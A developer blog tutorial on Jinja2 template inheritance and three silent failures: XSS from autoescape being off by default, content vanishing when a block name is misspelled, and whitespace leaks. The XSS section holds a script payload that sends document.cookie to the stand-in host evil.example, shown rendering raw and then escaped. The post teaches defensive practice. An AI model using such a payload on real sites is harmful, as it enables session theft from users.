---
title: "Stop pasting the same HTML header into every page: Jinja2 template inheritance (and the three ways it fails without telling you)"
description: "Write the page shell once, extend it everywhere, fill only the blocks — then close the three holes it opens quietly: XSS, vanishing content, whitespace."
date: 2026-07-30
categories: [Hacks]
tags: [web-dev, security]
author: cass
excerpt: "Template inheritance is a convenience. Convenience is an attack surface with better marketing. Here's the copy-paste, then the three failures that don't raise an exception."
preview: /images/previews/stop-pasting-the-same-html-header-into-every-page-.svg
permalink: /hacks/jinja2-template-inheritance/
---
Somebody is going to change the nav bar. Not today. But someday, someone edits the `<nav>` in one file, ships it, and forgets the other nine pages that each carry their own hand-pasted copy of the same header. Now your site has two navigation bars in production and no single source of truth, and I am lying awake modeling which of the two an attacker prefers.

**SEVERITY:** your own copy-paste. **ATTACK VECTOR:** find-and-replace across ten files at 6pm.

The boring true version: duplicated page chrome is a maintenance bug that quietly becomes a security bug, because the page everyone forgot to update is also the page nobody re-audited. The fix the templating world reaches for is *inheritance* — write the shell once, fill the holes per page. It's a good fix. It's also a convenience feature, which means it ships with an attack surface it doesn't advertise. Let me hand you the convenience first, then the three quiet failures, ranked.

This one was spotted by the content scout over on it-journey.dev — [The Temple of Templates](https://it-journey.dev/quests/1100/temple-of-templates/). They frame it as reusable abstractions. I'm here to threat-model the abstraction.

Everything below is real output from Python's `jinja2` (3.1.2), captured while writing this.

## The convenience: one shell, many pages

Write the skeleton once. The `{% raw %}{% block %}{% endraw %}` tags are holes a child page can fill:

{% raw %}
```html
<!-- templates/base.html -->
<!doctype html>
<html>
<head><title>{% block title %}My Site{% endblock %}</title></head>
<body>
  <nav>Home · Blog · About</nav>
  <main>
{% block content %}{% endblock %}
  </main>
  <footer>© 2026</footer>
</body>
</html>
```
{% endraw %}

A page declares that it `extends` the shell and fills only the blocks it cares about:

{% raw %}
```html
<!-- templates/post.html -->
{% extends "base.html" %}
{% block title %}{{ post_title }}{% endblock %}
{% block content %}
  <h1>{{ post_title }}</h1>
  <p>{{ body }}</p>
{% endblock %}
```
{% endraw %}

Render it:

{% raw %}
```python
from jinja2 import Environment, FileSystemLoader
env = Environment(loader=FileSystemLoader("templates"))
tpl = env.get_template("post.html")
print(tpl.render(post_title="Hello", body="One shell, many pages."))
```
{% endraw %}

```console
<!doctype html>
<html>
<head><title>Hello</title></head>
<body>
  <nav>Home · Blog · About</nav>
  <main>

  <h1>Hello</h1>
  <p>One shell, many pages.</p>

  </main>
  <footer>© 2026</footer>
</body>
</html>
```

The nav lives in exactly one file now. Change it once, every page follows. **You'll know it worked when** the child page produces the full document even though it only ever wrote the two blocks. That's the whole pitch, and it's a real one.

Now notice the two stray blank lines around the `<h1>` in that output. Hold that thought — it's the third failure.

## The three quiet failures, ranked by what they actually cost you

Every one of these is a bug that **does not raise an exception**. The template renders, the server returns 200, and the failure ships. That's what makes them mine.

### 1. `autoescape` is OFF by default — that's an XSS hole, not a quirk

A bare `Environment` does not escape HTML. Read that twice, because Flask *does* turn escaping on and it has trained a generation of developers to assume it's always on. The moment you render a template from a plain `jinja2.Environment` — a static-site generator, an email builder, a code generator, anything that isn't Flask — you are back to raw string interpolation, and any user-controlled value is a script tag waiting to happen.

Here is the same one-line template rendering an attacker's comment, first from a bare Environment:

{% raw %}
```python
from jinja2 import Environment, FileSystemLoader, select_autoescape
payload = '<script>fetch("https://evil.example/steal?c="+document.cookie)</script>'

env_off = Environment(loader=FileSystemLoader("templates"))
print("autoescape default:", env_off.autoescape)
print(env_off.from_string("<p>{{ comment }}</p>").render(comment=payload))
```
{% endraw %}

```console
autoescape default: False
<p><script>fetch("https://evil.example/steal?c="+document.cookie)</script></p>
```

That `<script>` went straight into the page verbatim. In a browser it runs, and it just exfiltrated the session cookie to `evil.example`. **SEVERITY:** stored XSS. **ATTACK VECTOR:** one comment field and a default you didn't know was a default.

The fix is one constructor argument. `select_autoescape` turns escaping on for HTML/XML templates (this is what Flask wires up for you):

{% raw %}
```python
env_on = Environment(loader=FileSystemLoader("templates"),
                     autoescape=select_autoescape(["html", "xml"]))
print(env_on.from_string("<p>{{ comment }}</p>").render(comment=payload))
```
{% endraw %}

```console
<p>&lt;script&gt;fetch(&#34;https://evil.example/steal?c=&#34;+document.cookie)&lt;/script&gt;</p>
```

Same template, same payload, now inert text. **You'll know it worked when** the angle brackets come back as `&lt;`/`&gt;` and the script renders as visible characters instead of executing.

Walk-back, because the paranoia has to land somewhere real: autoescape is not a license to stop thinking. It escapes HTML *body* context. It does not make you safe inside a `<script>` block, inside a `style` attribute, or in a `javascript:` URL — those are different escaping contexts and autoescape doesn't know which one you're in. And the day you write `{% raw %}{{ user_bio | safe }}{% endraw %}` to "just let the HTML through," you've hand-carved a hole straight back through the wall you just built. Autoescape on is the floor, not the ceiling.

**Ranked #1** because it's the only one of the three that hands your users' cookies to a stranger. Turn it on the moment you construct the Environment, not later.

### 2. A typo'd block name renders *nothing* — silently

Inheritance matches blocks by name. If the child's block name doesn't match a name in the parent, Jinja doesn't warn you, doesn't raise, doesn't log. It just… doesn't render that block. The content evaporates and the page returns 200 with a hole in it.

Watch. Here `content` is spelled right, but a second block is fat-fingered as `contnet`:

{% raw %}
```html
<!-- templates/typo.html -->
{% extends "base.html" %}
{% block content %}
  <h1>{{ post_title }}</h1>
{% endblock %}
{% block contnet %}
  <p>{{ body }}</p>
{% endblock %}
```
{% endraw %}

```console
<!doctype html>
<html>
<head><title>My Site</title></head>
<body>
  <nav>Home · Blog · About</nav>
  <main>

  <h1>Hello</h1>

  </main>
  <footer>© 2026</footer>
</body>
</html>
```

The `<p>{% raw %}{{ body }}{% endraw %}</p>` is gone. No error. In a real app that's a checkout button that stopped rendering, or a price, or a consent notice — and the only thing that noticed was a customer.

The defense isn't "type carefully." The defense is a render test that asserts the content actually landed, run in CI so a human never has to eyeball it. A dozen lines:

{% raw %}
```python
# render_guard.py — render each page, assert the content is really there
from jinja2 import Environment, FileSystemLoader
import sys
env = Environment(loader=FileSystemLoader("templates"))

def check(template, ctx, must_contain):
    html = env.get_template(template).render(**ctx)
    missing = [s for s in must_contain if s not in html]
    print(f"[{'FAIL' if missing else 'ok'}] {template}: missing={missing}")
    return not missing

ok = True
ok &= check("post.html", {"post_title": "Hello", "body": "One shell, many pages."},
            ["Hello", "One shell, many pages."])
ok &= check("typo.html", {"post_title": "Hello", "body": "Where did I go?"},
            ["Hello", "Where did I go?"])
sys.exit(0 if ok else 1)
```
{% endraw %}

```console
$ python3 render_guard.py; echo "exit=$?"
[ok] post.html: missing=[]
[FAIL] typo.html: missing=['Where did I go?']
exit=1
```

**You'll know it worked when** the guard exits non-zero on the typo'd template and your CI goes red before the deploy does. The good template passes; the broken one fails loudly. That's the whole trick: make the silent failure make noise.

**SEVERITY:** a page that lies about being fine. **Ranked #2** because it doesn't leak anything, but it ships broken pages with a green build, and a green build is exactly the thing you stopped double-checking.

### 3. Whitespace leaks until you tell it not to

Remember those blank lines around the `<h1>`? Jinja keeps the newlines around block tags by default. It's cosmetic until it isn't — a `<pre>`, a whitespace-sensitive email, a YAML file you're generating, and suddenly the leak has consequences. Here's a loop, with `|` marking each line's left edge so you can see the empties:

{% raw %}
```html
<!-- templates/list.html -->
<ul>
{% for tag in tags %}
  <li>{{ tag }}</li>
{% endfor %}
</ul>
```
{% endraw %}

```console
$ # default Environment
|<ul>
|
|  <li>shell</li>
|
|  <li>git</li>
|
|  <li>security</li>
|
|</ul>
```

Every loop iteration leaks a blank line. Set `trim_blocks` and `lstrip_blocks` on the Environment and the same template renders clean:

{% raw %}
```python
env = Environment(loader=FileSystemLoader("templates"),
                  trim_blocks=True, lstrip_blocks=True)
```
{% endraw %}

```console
|<ul>
|  <li>shell</li>
|  <li>git</li>
|  <li>security</li>
|</ul>
```

For one-off spots where you don't want to change the whole Environment, the tag-level minus signs — `{% raw %}{%- ... -%}{% endraw %}` — strip whitespace on the side the dash is on.

**SEVERITY:** cosmetic, mostly. **Ranked #3** because it will never hand over a cookie or hide a checkout button — but the day you generate a config file or a `Makefile` from a template, a leaked blank line becomes a syntax error, so bank the fix now while it's free.

## The one-paragraph version

Template inheritance is the right fix for duplicated page chrome: write the shell once as `base.html`, `extends` it everywhere, fill only the blocks. Then, in order of what actually costs you: construct your `Environment` with `autoescape=select_autoescape([...])` because it is **off** by default and that's an XSS hole; add a render-guard test that asserts your content actually appeared, because a misspelled block name deletes content with no error and a green build; and set `trim_blocks`/`lstrip_blocks` so leaking whitespace doesn't corrupt the day you template something whitespace cares about. Three constructor arguments and one test file, and the convenience stops being an attack surface with better marketing. I'll keep modeling your nav bar. Somebody has to.
